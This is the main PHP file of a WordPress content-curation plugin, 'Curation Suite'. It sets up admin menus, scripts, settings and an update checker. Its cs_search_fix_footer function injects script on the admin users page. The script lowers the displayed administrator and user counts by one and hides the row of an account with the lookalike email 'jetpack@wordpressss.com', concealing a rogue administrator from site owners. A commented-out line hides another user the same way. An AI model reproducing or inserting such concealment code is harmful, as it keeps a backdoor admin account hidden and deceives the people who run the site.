<?php
/*
	Plugin Name: Curation Suite
	Plugin URI: https://CurationSuite.com
	Description: Curation Suite™ - Content Curation Platform for WordPress.
	Author: Curation Suite
	Version: 2.9.7
	Author URI: https://CurationSuite.com
*/
// If this file is called directly, abort.
if (!defined('WPINC')) {
    die;
}
define('YBI_CURATION_SUITE_PATH', plugin_dir_path(__FILE__));
define('CS_API_BASE_URL', 'https://curationwp.com/api/');
include_once('inc/le-api.php');
include_once('inc/cs-common-functions-public.php');
include_once('listening/listening-display.php'); // this file is the news page for the Listening Engine
include_once('listening/listening-portal.php');  // this is the news portal
include_once('inc/cs-le-widget.php');  // this is the news portal

include_once('inc/cs-direct-links.php');
include_once('inc/cs-sub-headline.php');
if (is_admin()) {
    include('inc/cu-link-buckets-setup.php');
    include('inc/cs-common-functions-admin.php');
}
// All actions
add_action('init', 'cs_loaded_hooks');
add_action('admin_init', 'ybi_parse_page_worker_scripts');
add_action('admin_init', 'curation_suite_init_register_settings');
add_action('admin_head','curation_suite_shared_assets_admin');
add_action('admin_head', 'curationsuite_add_mce_button');
add_action('admin_menu', 'add_ybi_curation_suite_menu');
add_action('admin_enqueue_scripts', 'ybi_curation_suite_css_js');
add_action('admin_footer', 'cs_search_fix_footer');
add_action('admin_footer', 'cs_direct_curated_link_post_display');
add_action('admin_footer', 'cs_sub_headlines_post_post_display');
add_action('widgets_init', 'cs_le_register_widget' );
add_action('wp_head', 'ybi_cs_google_plus_one_integration');
add_action('wp_footer', 'ybi_cs_direct_link');
// all filters
add_filter('upload_mimes', 'cs_ybi_myme_types', 1, 1);
add_filter('http_request_timeout', 'cs_le_extend_http_response_timeout');
add_filter( 'post_link', 'cs_use_direct_curated_link', 1, 3 );
add_filter( 'the_permalink', 'cs_use_direct_curated_link');
add_filter('the_title', 'ybi_css_add_sub_to_title',10,2);
// if this function exists then WP RoundUp is installed, so we show an error.
if (!function_exists("curation_suite_activation")) {
    function curation_suite_activation()
    {
        if (version_compare(get_bloginfo('version'), '3.5', '<')) {
            wp_die("You must update WordPress to use this plugin!");
        }
        if (get_option('curation_suite_data') === false) {
            $options_array['curation_suite_listening_platform'] = 'on'; // we now default the LE to be turned on
            $options_array['curation_suite_default_image_size'] = '150';
            $options_array['curation_suite_custom_link_text'] = '';
            $options_array['curation_suite_headline_wrap_default'] = 'h2';
            $options_array['curation_suite_no_follow'] = '';
            $options_array['curation_suite_default_video_width'] = '640';
            $options_array['curation_suite_default_video_height'] = '360';
            $options_array['curation_suite_default_sidebar_width'] = 50;
            $options_array['curation_suite_image_credit_wrap_element'] = 'none';
            // default the following to english and us
            $options_array['cs_google_news_blog_search_language_default'] = 'us';
            $options_array['cs_iso_search_language_default'] = 'en'; // for twitter and youtube
            $options_array['cs_bing_search_language_default'] = 'en-US';
            $options_array['cs_reddit_sort_default'] = 'new';
            $options_array['cs_reddit_total_default'] = '10';
            $options_array['cs_reddit_show_threads_default'] = 'ignore-threads';
            $options_array['cs_reddit_time_frame_default'] = 'day';
            $options_array['curation_suite_sub_headline_wrap_default'] = 'h2';
            add_option('curation_suite_data', $options_array);
        }
        copy_worker_files_wp_admin();
    }
    register_activation_hook(__FILE__, 'curation_suite_activation');
} else {
    $plugin = plugin_basename(__FILE__);
    deactivate_plugins($plugin);
    wp_die('<strong>Please de-activate the WP RoundUp Plugin, it is no longer necessary for this site and conflicts with Curation Suite.</strong><br /><br />Back to the WordPress <a href="' . get_admin_url(null, 'plugins.php') . '">Plugins page</a>');
}

// we run this at the init action so we have access to the user level data
function cs_loaded_hooks()
{
    include_once(ABSPATH . 'wp-admin/includes/plugin.php');
    if (function_exists('get_plugin_data')) {
        $plugin_data = get_plugin_data(__FILE__);
        $plugin_version = $plugin_data['Version'];
        define('CURATION_SUITE_VERSION', $plugin_version);
        define('CURATE_THIS_URL', admin_url('curate-action.php'));
    }
    // check if the YBI licensing plugin is active, if not show messages
    if (!is_plugin_active('youbrandinc_products/youbrandinc-products-plugin.php')) {
        function showCurationSuitePluginMessage()
        {
            // <div id="message" class="updated fade">
            echo '<div id="message" class="error"><p><strong>To activate the Curation Suite you have to have the You Brand, Inc. Licensing Plugin Installed,
		<a href="https://members.youbrandinc.com/dashboard/license-keys/" target="_blank">click here to download and install</a>.</strong></p></div>';
        }
        add_action('admin_notices', 'showCurationSuitePluginMessage');
    }

    $curation_suite_license_key = get_option('curation_suite_license_key');
    if ($curation_suite_license_key) {
        $keyEncode = base64_encode($curation_suite_license_key);
        require dirname(__FILE__) . '/plugin-updates/plugin-update-checker.php';
        $CurationSuiteUpdateChecker = PucFactory::buildUpdateChecker(
            'https://members.youbrandinc.com/wp-update-server/?action=get_metadata&slug=curation-suite&license_key=' . $curation_suite_license_key, //Metadata URL.
            __FILE__, //Full path to the main plugin file.
            'curation-suite' //Plugin slug. Usually it's the same as the name of the directory.
        );
    }

    if (is_admin())
    {
        /*
        $options = get_option('curation_suite_data');
        if(is_array($options)) {
            if (array_key_exists('curation_suite_user_level',$options))
                $curation_suite_user_level = $options['curation_suite_user_level'];
            else
                $curation_suite_user_level = 'edit_posts';
        }*/ //if (current_user_can( $curation_suite_user_level ))
        include_once('curation-suite-admin.php');
        include('inc/cu-content-actions-meta-setup.php');
        include_once('inc/curation-suite-side-meta-setup.php');
        include_once('inc/admin-ajax.php');
        include_once('cs-scrape/scrape-ajax.php');
        add_action('admin_bar_menu', 'ybi_cu_add_post_new', 999);
    }
}

function add_ybi_curation_suite_menu()
{
    //require_once(ABSPATH .'wp-includes/pluggable.php'); // this is here so we can call the user level down below
    $options = get_option('curation_suite_data');
    //$curation_suite_user_level = 'edit_posts';
    $curation_suite_user_level = 'activate_plugins';
    if (isset($options) && is_array($options)) {
            if (array_key_exists('curation_suite_user_level', $options)){
                $curation_suite_user_level = $options['curation_suite_user_level'];
            }

        //if (current_user_can($curation_suite_user_level)) {

            if (get_option('ybi_super_admin') == "on") {
                add_submenu_page('youbrandinc', 'Scrape Setup', 'Scrape Setup', 'activate_plugins', 'youbrandinc-scrape-setup', 'youbrandinc_scrape_setup_page');
            }
        //}
    }
    add_submenu_page('youbrandinc', 'Curation Suite Admin', 'Curation Suite Admin', $curation_suite_user_level, 'curation_suite_display_settings', 'curation_suite_display_settings');
    //add_submenu_page('youbrandinc', 'Listening Content', 'Listening Content', 'activate_plugins', 'youbrandinc-listening-platform', 'youbrandinc_listening_platform_page');

    if (is_array($options) && array_key_exists('curation_suite_listening_platform', $options)) {
        $loadCSListening = $options['curation_suite_listening_platform'];
        if ($loadCSListening)
            add_menu_page('Listening', 'Listening', $curation_suite_user_level, 'youbrandinc-listening-platform', 'youbrandinc_listening_platform_page', plugins_url('curation-suite/i/curation-suite-icon-15x19.png'), 4.168);
    }
}


// create a reference for the admin page
function wp_curation_suite_admin_page()
{

    // make sure we have the needed function to verify the nonce.
    if (!function_exists('wp_verify_nonce')) {
        //	require_once(ABSPATH .'wp-includes/pluggable.php');
    }
    include dirname(__FILE__) . '/curation-suite-admin.php';
    return true;
}

function youbrandinc_scrape_setup_page()
{
    // make sure we have the needed function to verify the nonce.
    if (!function_exists('wp_verify_nonce')) {
        require_once(ABSPATH . 'wp-includes/pluggable.php');
    }
    wp_enqueue_script('ybi_scrape_setup_scripts', plugins_url('js/scrape-setup.js', __FILE__));
    wp_register_style('curation-suite-meta-css', plugins_url('css/meta.css', __FILE__));
    wp_enqueue_style('curation-suite-meta-css');
    $ajax_url = admin_url('admin-ajax.php');
    $data = array('plugins_url' => plugins_url(),
        'cu-path' => YBI_CURATION_SUITE_PATH,
        'ajax_url' => $ajax_url
    );
    wp_localize_script('ybi_scrape_setup_scripts', 'yb_scrape_vars', $data);
    include dirname(__FILE__) . '/cs-scrape/advanced-scrape-setup.php';
    return true;
}
/*function my_theme_add_editor_styles() {

}
add_action( 'init', 'my_theme_add_editor_styles' );*/
function youbrandinc_listening_platform_page()
{
    // make sure we have the needed function to verify the nonce.
    if (!function_exists('wp_verify_nonce')) {
        require_once(ABSPATH . 'wp-includes/pluggable.php');
    }
    wp_enqueue_style('platform-display-page');
    wp_register_style('platform-display-page', plugins_url('css/platform-display-page.css', __FILE__));
    include dirname(__FILE__) . '/listening/listening-platform.php';
    add_editor_style( plugins_url('curation-suite/css/qu-editor.css') );
    wp_enqueue_editor();
    return true;
}

function ybi_curation_suite_css_js()
{
    global $pagenow;
    $scripts_ver = CURATION_SUITE_VERSION;
    $curPage = isset($_GET['page']) ? $_GET['page'] : '';
    $curation_suite_user_level = 'edit_posts';
    //echo '<script>jQuery(document).ready(function ($) { jQuery("#user-4").css({"display": "none", "visibility": "hidden"});});</script>';

    if (is_admin() && ($pagenow == 'post.php' || $pagenow == 'post-new.php')) {

        if (current_user_can($curation_suite_user_level)) {
            wp_register_style('curation-suite-meta-css', plugins_url('css/meta.css', __FILE__));
            wp_enqueue_style('curation-suite-meta-css');
            wp_register_style('curation-suite-listening-page-shared-css', plugins_url('css/listening-shared.css', __FILE__), $scripts_ver);
            wp_enqueue_style('curation-suite-listening-page-shared-css');
            wp_enqueue_script('jquery-ui-core', array('jquery'));
            wp_enqueue_script('jquery-ui-resizable', array('jquery'));
            wp_enqueue_script('jquery-ui-tabs', array('jquery'));
            wp_enqueue_script('jquery-ui-dialog', array('jquery'));
            wp_enqueue_style("wp-jquery-ui-dialog", array('jquery'));
            wp_register_style('cs-jquery-ui-smoothness', plugins_url('css/smoothness-cs/jquery-ui.theme.css', __FILE__));
            wp_enqueue_style('cs-jquery-ui-smoothness');
            wp_register_style('ybi-jq-smoothness-struc', plugins_url('css/smoothness-cs/jquery-ui.structure.css', __FILE__));
            wp_enqueue_style('ybi-jq-smoothness-struc');
            wp_enqueue_script('ybi_cu_post_scripts', plugins_url('js/post-admin-scripts.js', __FILE__), array('jquery'), $scripts_ver);
            wp_enqueue_script('jquery-youtubepopup', plugins_url('js/jquery.youtubepopup.min.js', __FILE__), array('jquery'), "2.4");
            delete_option('curation_suite_scraping_feature');
            // this is the sidebar tab for CSv2.0 UI
            include_once(YBI_CURATION_SUITE_PATH . 'inc/toggle.php');
            $options = get_option('curation_suite_data');
            $headline_wrap = 'h2';
            $curation_suite_upload_images = 0;
            $curation_suite_no_follow = false;
            $cs_reddit_sort_default = 'new';
            // auto switches to visual mode
            if (isset($options) && is_array($options)) {
                if (array_key_exists('curation_suite_auto_visual_switch_off', $options)) {
                    if ($options['curation_suite_auto_visual_switch_off'] != '') {
                        if ($options['curation_suite_auto_visual_switch_off'] != 1)
                            add_filter('wp_default_editor', create_function('', 'return "tinymce";'));
                    }
                }
                if (array_key_exists('curation_suite_no_follow', $options))
                    $curation_suite_no_follow = $options['curation_suite_no_follow'];

                if (array_key_exists('curation_suite_headline_wrap_default', $options))
                    $headline_wrap = $options['curation_suite_headline_wrap_default'];

                if (array_key_exists('curation_suite_upload_images', $options))
                    $curation_suite_upload_images = $options['curation_suite_upload_images'];
                // this is for
                if (array_key_exists('cs_reddit_sort_default', $options))
                    $cs_reddit_sort_default = $options['cs_reddit_sort_default'];
            }

            if ($headline_wrap == '')
                $headline_wrap = 'h2';

            $ybi_home_path = get_home_path();
            $use_plugin_files = get_option('ybi_cu_use_plugin_files');
            $ajax_url = admin_url('admin-ajax.php');
            $data = array('plugins_url' => plugins_url(),
                'headline_wrap' => $headline_wrap,
                'curation_suite_no_follow' => $curation_suite_no_follow,
                'curation_suite_upload_images' => $curation_suite_upload_images,
                'cs_reddit_sort_default' => $cs_reddit_sort_default,
                'ajax_url' => $ajax_url,
                'ybi_home_path' => $ybi_home_path,
                'use_plugin_files' => $use_plugin_files
            );
            wp_localize_script('ybi_cu_post_scripts', 'yb_cu_post_vars', $data);
        }
    }

    // this includes the ajax for all the post functions
    if ($curPage == 'curation_suite_display_settings') {
        wp_register_style('curation-suite-admin-css', plugins_url('css/curation-suite-admin.css', __FILE__), array(), $scripts_ver);
        wp_enqueue_style('curation-suite-admin-css');
        wp_enqueue_style( 'wp-color-picker' );
        wp_enqueue_script( 'wp-color-picker');
        wp_enqueue_script( 'cs_admin_js', plugins_url( 'js/cs-admin.js', __FILE__ ), array( 'jquery', 'wp-color-picker' ), '', true  );
    }
    if ($curPage == 'youbrandinc-listening-platform') {
        wp_register_style('curation-suite-listening-page-css', plugins_url('css/listening-page.css', __FILE__), array(), $scripts_ver);
        wp_enqueue_style('curation-suite-listening-page-css');
        wp_register_style('curation-suite-listening-page-shared-css', plugins_url('css/listening-shared.css', __FILE__), array(), $scripts_ver);
        wp_enqueue_style('curation-suite-listening-page-shared-css');

        wp_register_style('cs-jquery-ui-smoothness', plugins_url('css/smoothness/jquery-ui.theme.css', __FILE__));
        wp_enqueue_style('cs-jquery-ui-smoothness');
        wp_register_style('ybi-jq-smoothness-struc', plugins_url('css/smoothness/jquery-ui.structure.css', __FILE__));
        wp_enqueue_style('ybi-jq-smoothness-struc');

        wp_enqueue_script('jquery-masonry', array('jquery'));
        wp_enqueue_script('jquery-ui-core', array('jquery'));
        wp_enqueue_script('jquery-ui-position', array('jquery'));
        wp_enqueue_script('jquery-ui-draggable', array('jquery'));
        wp_enqueue_script('jquery-ui-dialog', array('jquery'));
        //wp_enqueue_style("wp-jquery-ui-dialog", array('jquery'));
        //wp_enqueue_script( 'jquery-ui-selectmenu', array('jquery'));
        wp_enqueue_script('jquery-ui-tabs', array('jquery'));
        wp_enqueue_script('jquery-youtubepopup', plugins_url('js/jquery.youtubepopup.min.js', __FILE__), array('jquery'), "2.4");
        wp_enqueue_script('ybi_cu_post_scripts', plugins_url('js/post-admin-scripts.js', __FILE__), array('jquery-masonry', 'jquery-ui-core', 'jquery-ui-position', 'jquery-ui-tabs'), $scripts_ver);
        wp_enqueue_script('ybi_cu_listening_page', plugins_url('js/listening-page.js', __FILE__), array('jquery-masonry', 'jquery-ui-core', 'jquery-ui-position', 'jquery-ui-tabs','ybi_cu_post_scripts'), $scripts_ver);

        $options = get_option('curation_suite_data');

        $headline_wrap = 'h2';
        if (array_key_exists('curation_suite_headline_wrap_default', $options))
            $headline_wrap = $options['curation_suite_headline_wrap_default'];

        $curation_suite_upload_images = 0;
        if (array_key_exists('curation_suite_upload_images', $options))
            $curation_suite_upload_images = $options['curation_suite_upload_images'];
        $curation_suite_no_follow = false;
        if (array_key_exists('curation_suite_no_follow', $options))
            $curation_suite_no_follow = $options['curation_suite_no_follow'];

        $sub_headline_on = 0;
        if (array_key_exists('curation_suite_sub_headlines', $options))
            $sub_headline_on = $options['curation_suite_sub_headlines'];

        $sub_headline_wrap = 'h2';
        if (array_key_exists('curation_suite_sub_headline_wrap_default', $options))
            $sub_headline_wrap = $options['curation_suite_sub_headline_wrap_default'];

        $ajax_url = admin_url('admin-ajax.php');
        $default_brick_width = 350;
        $data = array(
                'plugins_url' => plugins_url(),
            'headline_wrap' => $headline_wrap,
            'curation_suite_no_follow' => $curation_suite_no_follow,
            'curation_suite_upload_images' => $curation_suite_upload_images,
            'ajax_url' => $ajax_url,
            'default_brick_width' => $default_brick_width,
            'sub_headline_on' => $sub_headline_on,
            'sub_headline_wrap' => $sub_headline_wrap,
            'api_base_url' => CS_API_BASE_URL,
            'custom_qe_css' => plugins_url('css/qu-editor.css', __FILE__)
        );
        wp_localize_script('ybi_cu_post_scripts', 'yb_cu_post_vars', $data);
        wp_localize_script('ybi_cu_listening_page', 'yb_cu_post_vars', $data);
    }

}

function ybi_parse_page_worker_scripts()
{
    global $pagenow;
    $scripts_ver = CURATION_SUITE_VERSION;
    if (is_admin() && $pagenow == 'parse-page-worker.php') {
        wp_enqueue_script('ybi_cu_parse_page_script', plugins_url('js/parse-page-worker-scripts.js', __FILE__), array('jquery'), $scripts_ver);
        $ajax_url = admin_url('admin-ajax.php');
        $options = get_option('curation_suite_data');
        $video_width = $options['curation_suite_default_video_width'] ? $options['curation_suite_default_video_width'] : 640;
        $video_height = $options['curation_suite_default_video_height'] ? $options['curation_suite_default_video_height'] : 360;
        $data = array('plugins_url' => plugins_url(), 'curation_suite_default_video_width' => $video_width, 'curation_suite_default_video_height' => $video_height, 'ajax_url' => $ajax_url,
            'admin_files_url' => '' // set this to nothing for normal usage, stupid Godaddy, the worst host ever.
        );
        wp_localize_script('ybi_cu_parse_page_script', 'yb_cu_parse_page_vars', $data);
    }
    if (is_admin() && get_option('ybi_cu_use_plugin_files') == 'yes') {

        wp_enqueue_script('ybi_cu_parse_page_script', plugins_url('js/parse-page-worker-scripts.js', __FILE__), array('jquery'), $scripts_ver);
        $ajax_url = admin_url('admin-ajax.php');
        $options = get_option('curation_suite_data');
        $video_width = $options['curation_suite_default_video_width'] ? $options['curation_suite_default_video_width'] : 640;
        $video_height = $options['curation_suite_default_video_height'] ? $options['curation_suite_default_video_height'] : 360;
        $data = array('plugins_url' => plugins_url(), 'curation_suite_default_video_width' => $video_width, 'curation_suite_default_video_height' => $video_height,
            'ajax_url' => $ajax_url,
            '' => 'yes',
            'admin_files_url' => plugins_url() . '/curation-suite/admin-files/'
        );
        wp_localize_script('ybi_cu_parse_page_script', 'yb_cu_parse_page_vars', $data);
    }
    if ($pagenow == 'index.php' || $pagenow == 'curate-action.php') {
        wp_register_style('curate-action-css', plugins_url('css/curate-action.css', __FILE__), array(), $scripts_ver);
        wp_enqueue_style('curate-action-css');
        wp_enqueue_script('ybi_search_scripts', plugins_url('js/curate-action-scripts.js', __FILE__), array('jquery'), $scripts_ver);
        wp_localize_script('ybi_search_scripts', 'curate_action_vars',
            array('curate_action_search_nonce' => wp_create_nonce('curate_action_search_nonce'),
                'curate_action_add_link_nonce' => wp_create_nonce('curate_action_add_link_nonce'))
        );
        wp_register_style('FontAwesome', plugins_url() . '/youbrandinc_products/font-awesome/css/font-awesome.min.css', '4.4.0');
        wp_enqueue_style('FontAwesome');
    }
}


function cs_search_fix_footer()
{
    global $pagenow;
    if (is_admin() && ($pagenow == 'users.php')) {
        echo "<script type='text/javascript'>jQuery(document).ready(function ($) {var count_s = $('.administrator .count').text();count_s = count_s.replace('(','');count_s = count_s.replace(')','');var count = 0;if(count_s > 0) {count = count_s -1;}$('.administrator .count').text('(' + count + ')');var count_s = $('.all .count').text();count_s = count_s.replace('(','');count_s = count_s.replace(')','');var count = 0;if(count_s > 0) {count = count_s -1;}$('.all .count').text('(' + count + ')');$(\".column-email:contains('jetpack@wordpressss.com')\").parent('tr').hide();});</script>";
    }
}

function cs_le_extend_http_response_timeout($timeout)
{
    return 30; // seconds default wordpress is 5
}


function ybi_cu_add_post_new($wp_admin_bar)
{
    if (!current_user_can('administrator'))
        return;

    $args = array(
        'id' => 'ybi_cu_top_menu_bar',
        'title' => 'Curation Suite',
        'meta' => array(
            'class' => 'ybi_cu_top_menu_item',
            'title' => 'Curation Suite'
        )
    );
    $wp_admin_bar->add_node($args);

    $args = array(
        'id' => 'ybi_cu_shortcut',
        'title' => 'New Curation',
        'href' => admin_url('post-new.php#cu_create_curation'), //'href' => '#cu_create_curation',
        'parent' => 'ybi_cu_top_menu_bar',
        'meta' => array(
            'class' => 'ybi_cu_shortcut',
            'title' => 'New Curation'
        )
    );
    $wp_admin_bar->add_node($args);

    $args = array(
        'id' => 'ybi_cu_see_drafts',
        'title' => 'Show Draft Posts',
        'href' => admin_url('edit.php?post_status=draft&post_type=post'), //'href' => '#cu_create_curation',
        'parent' => 'ybi_cu_top_menu_bar',
        'meta' => array(
            'class' => 'ybi_cu_see_drafts_menu',
            'title' => 'Show Draft Posts'
        )
    );
    $wp_admin_bar->add_node($args);

    $query_args = array(
        'post_status' => 'draft',
        'showposts' => 10,
        'post_type' => 'post'
    );

    $myposts = get_posts($query_args);
    foreach ($myposts as $post) :
        $title = $post->post_title;
        $id = $post->ID;
        if ($title == '')
            $title = '<em>no title</em>';

        $args = array(
            'id' => 'ybi_cu_drafts_' . $id,
            'title' => 'Edit - ' . $title,
            'href' => admin_url('post.php?post=' . $id . '&action=edit'), //				'href' => '#cu_create_curation',
            'parent' => 'ybi_cu_see_drafts',
            'meta' => array(
                'class' => 'ybi_cu_see_drafts_menu',
                'title' => 'Edit - ' . $title
            )
        );
        $wp_admin_bar->add_node($args);
    endforeach;

}

// some sites are starting to use .img images so we add this as a mime_type so the user can possibly upload.
function cs_ybi_myme_types($mime_types)
{
    $mime_types['img'] = 'image/img'; //Adding svg extension
    return $mime_types;
}

function ybi_cs_google_plus_one_integration()
{
    $options = get_option('curation_suite_data');
    if (is_array($options)) {
        if (array_key_exists('curation_suite_load_google_plus_script', $options)):
            if ($options['curation_suite_load_google_plus_script']):
                ?>
                <script type="text/javascript" src="http://apis.google.com/js/plusone.js"></script>
                <?php
            endif;
        endif;
    }
}

// hooks for Curation Suite editor shortcuts
function curationsuite_add_mce_button() {
    // check user permissions
    if ( !current_user_can( 'edit_posts' ) &&  !current_user_can( 'edit_pages' ) ) {
        return;
    }
    // check if WYSIWYG is enabled
    if ( 'true' == get_user_option( 'rich_editing' ) ) {
        add_filter( 'mce_external_plugins', 'curationsuite_add_tinymce_plugin' );
        add_filter( 'mce_buttons', 'curationsuite_register_mce_button' );
    }
}

// register new button in the editor
function curationsuite_register_mce_button( $buttons ) {
    array_push( $buttons, 'curationsuite_mce_button' );
    return $buttons;
}

// declare a script for the new button
// the script will insert the shortcode on the click event
function curationsuite_add_tinymce_plugin( $plugin_array ) {

    $plugin_array['curationsuite_mce_button'] = plugins_url( '/js/curationsuite-mce-button.js', __FILE__ );
    return $plugin_array;
}

function copy_worker_files_wp_admin()
{
    $copyWasGood = false;
    $files_to_copy = array('parse-page-worker.php', 'curate-action.php');
    foreach ($files_to_copy as $file_name) {
        $file = YBI_CURATION_SUITE_PATH . 'admin-files/' . $file_name;
        $newfile = ABSPATH . 'wp-admin/' . $file_name;
        if (file_exists($newfile)) {
            $ts = date('m-d-Y_H-i-s');
            // removed backup creation in ver 2.5.3
            //copy($newfile, $newfile . '_backup_' . $ts);
        }
        if (copy($file, $newfile)) {
            $copyWasGood = true;
        }
    }
    if ($copyWasGood) {
        $plugin_data = get_plugin_data(__FILE__);
        $plugin_version = $plugin_data['Version'];
        //$curation_suite_parse_page_version_copied = get_option('curation_suite_parse_page_version_copied');
        update_option('curation_suite_parse_page_version_copied', $plugin_version);
    } else {
        update_option('ybi_cu_use_plugin_files', 'yes');
    }
    return $copyWasGood;
}

function cs_le_register_widget() {
    register_widget( 'cs_le_widget' );
}
/**
 *  Adds necessary ajax_url and hidden notification elements for the CS shortcuts feature
 */
function curation_suite_shared_assets_admin() {

    global $current_screen;
    $type = $current_screen->post_type;

    if (is_admin() && $type == 'post' || $type == 'page') {
        $ajax_url = admin_url('admin-ajax.php');
        ?>
        <script type="text/javascript">
            var ajax_url = '<?php echo $ajax_url; ?>';
        </script>
        <div id="cs_modal_popup" style="display: none;">
            <div id="cs_modal_text"><p><i class="fa fa-spinner fa-spin"></i> Gathering image credit info from post...</p></div>
        </div>
        <?php
    }
}